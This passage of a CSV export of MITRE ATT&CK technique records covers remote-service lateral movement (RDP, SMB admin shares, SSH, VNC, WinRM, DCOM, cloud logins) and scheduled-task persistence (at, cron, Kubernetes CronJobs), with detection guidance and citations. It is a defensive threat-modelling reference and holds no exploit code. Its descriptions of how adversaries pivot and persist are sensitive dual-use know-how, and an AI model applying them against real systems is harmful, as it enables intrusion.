[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",https://attack.mitre.org/techniques/T1563/001,25 February 2020,23 March 2020,enterprise-attack,1.0,Lateral Movement,"Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.","Linux, macOS","Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1563,,Anastasios Pingios,root,,"SSH service enabled, trust relationships configured, established connections",,,",(Citation: Symantec SSH and ssh-agent)"
T1021.007,attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0,Remote Services: Cloud Services,"Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. 

Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.

In some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",https://attack.mitre.org/techniques/T1021/007,21 February 2023,14 April 2023,enterprise-attack,1.0,Lateral Movement,,"Azure AD, Google Workspace, IaaS, Office 365, SaaS",Logon Session: Logon Session Creation,True,T1021,,,,,,,,"(Citation: Mandiant Remediation and Hardening Strategies for Microsoft 365),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: Protecting Microsoft 365 From On-Premises Attacks)"
T1021.008,attack-pattern--45241b9e-9bbc-4826-a2cc-78855e51ca09,Remote Services: Direct Cloud VM Connections,"Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager).

Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. 

Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).",https://attack.mitre.org/techniques/T1021/008,02 June 2023,27 October 2023,enterprise-attack,1.0,Lateral Movement,,IaaS,Logon Session: Logon Session Creation,True,T1021,,"Thanabodi Phrakhun, @naikordian",,,,,,","
T1021.003,attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd,Remote Services: Distributed Component Object Model,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)

Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)

Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",https://attack.mitre.org/techniques/T1021/003,11 February 2020,11 August 2023,enterprise-attack,1.3,Lateral Movement,"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.

Monitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135).",Windows,"Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1021,,,,,,,,"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Cobalt Strike DCOM Jan 2017),(Citation: Github PowerShell Empire),(Citation: Microsoft System Wide Com Keys),(Citation: Microsoft COM ACL),(Citation: Microsoft Protected View),(Citation: Microsoft Disable DCOM),(Citation: Microsoft Process Wide Com Keys)"
T1021.001,attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf,Remote Services: Remote Desktop Protocol,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) 

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",https://attack.mitre.org/techniques/T1021/001,11 February 2020,07 August 2023,enterprise-attack,1.2,Lateral Movement,"Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",Windows,"Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1021,,"Matthew Demaske, Adaptforward",,,"RDP service enabled, account in the Remote Desktop Users group",,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: FireEye CARBANAK June 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye FIN10 June 2017),(Citation: FireEye APT39 Jan 2019),(Citation: aptsim),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Group IB Cobalt Aug 2017),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Cycraft Chimera April 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Volexity Patchwork June 2018),(Citation: Mandiant FIN12 Oct 2021),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Cymmetria Patchwork),(Citation: Novetta Blockbuster),(Citation: PWC Cloud Hopper April 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Fidelis njRAT June 2013),(Citation: Talos ZxShell Oct 2014),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Novetta-Axiom),(Citation: Costa AvosLocker May 2022),(Citation: SecureWorks August 2019),(Citation: Group IB Silence Sept 2018),(Citation: Twitter Cglyer Status Update APT3 eml),(Citation: Proofpoint TA505 Jan 2019),(Citation: Check Point Warzone Feb 2020),(Citation: Github Koadic),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FireEye TRITON 2019),(Citation: US-CERT TA18-074A),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye APT40 March 2019),(Citation: ClearSky Pay2Kitten December 2020),(Citation: BitDefender Chafer May 2020),(Citation: Cylance Shaheen Nov 2018),(Citation: FireEye FIN6 April 2016),(Citation: DFIR Phosphorus November 2021),(Citation: Mandiant FIN13 Aug 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: cobaltstrike manual),(Citation: Unit42 OilRig Playbook 2023),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Malwarebytes DarkComet March 2018),(Citation: FireEye PLA),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: GitHub Pupy),(Citation: CERT-FR PYSA April 2020),(Citation: McAfee Night Dragon),(Citation: Novetta Blockbuster RATs),(Citation: Cybereason Bumblebee August 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: GitHub QuasarRAT),(Citation: Windows RDP Sessions),(Citation: Berkley Secure)"
T1021.002,attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541,Remote Services: SMB/Windows Admin Shares,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",https://attack.mitre.org/techniques/T1021/002,11 February 2020,28 July 2023,enterprise-attack,1.2,Lateral Movement,"Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)",Windows,"Command: Command Execution, Logon Session: Logon Session Creation, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1021,,,,,SMB enabled; Host/network firewalls not blocking SMB ports between source and destination; Use of domain account in administrator group on remote system or default system admin account.,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Savill 1999),(Citation: Symantec Orangeworm April 2018),(Citation: Medium Anchor DNS July 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Symantec Buckeye),(Citation: CarbonBlack Conti July 2020),(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: SANS Conficker),(Citation: Malwarebytes Emotet Dec 2017),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Alperovitch 2014),(Citation: Fortinet Diavol July 2021),(Citation: Trend Micro Black Basta October 2022),(Citation: Dark Vortex Brute Ratel C4),(Citation: Talos Nyetya June 2017),(Citation: NCC Group APT15 Alive and Strong),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Cylance Cleaver),(Citation: Cycraft Chimera April 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Unit 42 Lucifer June 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Novetta Blockbuster),(Citation: Bleeping Computer - Ryuk WoL),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Cybereason Royal December 2022),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Novetta-Axiom),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: DFIR Ryuk's Return October 2020),(Citation: Kaspersky Regin),(Citation: MDSec Brute Ratel August 2022),(Citation: Cybereason Conti Jan 2021),(Citation: Kaspersky Turla),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Talos Olympic Destroyer 2018),(Citation: US-CERT NotPetya 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: PsExec Russinovich),(Citation: Symantec Chafer February 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: RedCanary Mockingbird May 2020),(Citation: Dell TG-1314),(Citation: ESET Hermetic Wizard March 2022),(Citation: McAfee Night Dragon),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Symantec W32.Duqu),(Citation: FireEye Shamoon Nov 2016),(Citation: Novetta Blockbuster RATs),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Microsoft Preventing SMB)"
T1021.004,attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6,Remote Services: SSH,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.

SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",https://attack.mitre.org/techniques/T1021/004,11 February 2020,11 August 2023,enterprise-attack,1.2,Lateral Movement,"Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

On macOS systems <code>log show --predicate 'process = ""sshd""'</code> can be used to review incoming SSH connection attempts for suspicious activity. The command <code>log show --info --predicate 'process = ""ssh"" or eventMessage contains ""ssh""'</code> can be used to review outgoing SSH connection activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

On Linux systems SSH activity can be found in the logs located in <code>/var/log/auth.log</code> or <code>/var/log/secure</code> depending on the distro you are using.","Linux, macOS","Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1021,,,,,An SSH server is configured and running.,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Symantec Palmerworm Sep 2020),(Citation: FireEye APT40 March 2019),(Citation: Github PowerShell Empire),(Citation: Aqua Kinsing April 2020),(Citation: Mandiant FIN13 Aug 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Cisco Talos Intelligence Group),(Citation: PWC Cloud Hopper April 2017),(Citation: Unit42 OilRig Playbook 2023),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye TRITON 2019),(Citation: Anomali Rocke March 2019),(Citation: FireEye APT39 Jan 2019),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Intezer TeamTNT September 2020),(Citation: Securelist GCMAN),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)"
T1021.005,attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b,Remote Services: VNC,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)

VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)

Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",https://attack.mitre.org/techniques/T1021/005,11 February 2020,30 March 2023,enterprise-attack,1.1,Lateral Movement,"Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.

On macOS systems <code>log show --predicate 'process = ""screensharingd"" and eventMessage contains ""Authentication:""'</code> can be used to review incoming VNC connection attempts for suspicious activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

Monitor for use of built-in debugging environment variables (such as those containing credentials or other sensitive information) as well as test/default users on VNC servers, as these can leave openings for adversaries to abuse.(Citation: Gnome Remote Desktop grd-settings)(Citation: Gnome Remote Desktop gschema)","Linux, Windows, macOS","Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1021,,,,,VNC server installed and listening for connections.,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Microsoft Actinium February 2022),(Citation: Trickbot VNC module July 2021),(Citation: Check Point Warzone Feb 2020),(Citation: Symantec Shuckworm January 2022),(Citation: ClearSky Siamesekitten August 2021),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: objsee mac malware 2017),(Citation: Unit 42 Gamaredon February 2022),(Citation: Talos ZxShell Oct 2014),(Citation: Securelist GCMAN),(Citation: Prevx Carberp March 2011),"
T1021.006,attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65,Remote Services: Windows Remote Management,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",https://attack.mitre.org/techniques/T1021/006,11 February 2020,11 August 2023,enterprise-attack,1.2,Lateral Movement,"Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior.  Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement) Also monitor for remote WMI connection attempts (typically over port 5985 when using HTTP and 5986 for HTTPS).",Windows,"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation, Service: Service Metadata",True,T1021,,,,,,,,"(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Palo Alto Brute Ratel July 2022),(Citation: NCC Group Chimera January 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: cobaltstrike manual),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Symantec RAINDROP January 2021),(Citation: NSA Spotting)"
T1053.002,attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0,Scheduled Task/Job: At,"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.

On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)

Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).

In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",https://attack.mitre.org/techniques/T1053/002,27 November 2019,11 August 2023,enterprise-attack,2.1,"Execution, Persistence, Privilege Escalation","Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\System32\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.

Configure event logging for scheduled task creation and changes by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)

Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.

In Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. 

Review all jobs using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables, machines that created the jobs, are trusted hosts. All [at](https://attack.mitre.org/software/S0110) jobs are stored in <code>/var/spool/cron/atjobs/</code>.(Citation: rowland linux at 2019)

Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [Command and Control](https://attack.mitre.org/tactics/TA0011), learning details about the environment through [Discovery](https://attack.mitre.org/tactics/TA0007), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008).","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Network Traffic: Network Traffic Flow, Process: Process Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,,"Administrator, User",1.0,,,,"(Citation: Linux at),(Citation: FireEye Periscope March 2018),(Citation: CME Github September 2018),(Citation: TechNet At),(Citation: Dell TG-3390),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Dell Lateral Movement),(Citation: Powersploit),(Citation: TechNet Scheduling Priority),(Citation: Secureworks - AT.exe Scheduled Task),(Citation: Kifarunix - Task Scheduling in Linux),(Citation: TechNet Server Operator Scheduled Task)"
T1053.007,attack-pattern--1126cab1-c700-412f-a510-61f4937bb096,Scheduled Task/Job: Container Orchestration Job,"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.

In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",https://attack.mitre.org/techniques/T1053/007,29 March 2021,15 April 2023,enterprise-attack,1.3,"Execution, Persistence, Privilege Escalation",Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments. ,Containers,"Container: Container Creation, File: File Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",User,1.0,,,,",(Citation: Kubernetes Hardening Guide)"
T1053.003,attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c,Scheduled Task/Job: Cron,"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.

An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ",https://attack.mitre.org/techniques/T1053/003,03 December 2019,24 March 2022,enterprise-attack,1.1,"Execution, Persistence, Privilege Escalation","Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  

Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. ","Linux, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,,User,,,,,"(Citation: Aqua Kinsing April 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Medium Anchor DNS July 2020),(Citation: ESET TeleBots Oct 2018),(Citation: Unit 42 Rocke January 2019),(Citation: Janicab),(Citation: CrowdStrike StellarParticle January 2022),(Citation: ANSSI Sandworm January 2021),(Citation: Talos Rocke August 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Trend Micro Skidmap),(Citation: Leonardo Turla Penquin May 2020),(Citation: Anomali Rocke March 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),"
T1053.005,attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9,Scheduled Task/Job: Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.

The deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.

An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)

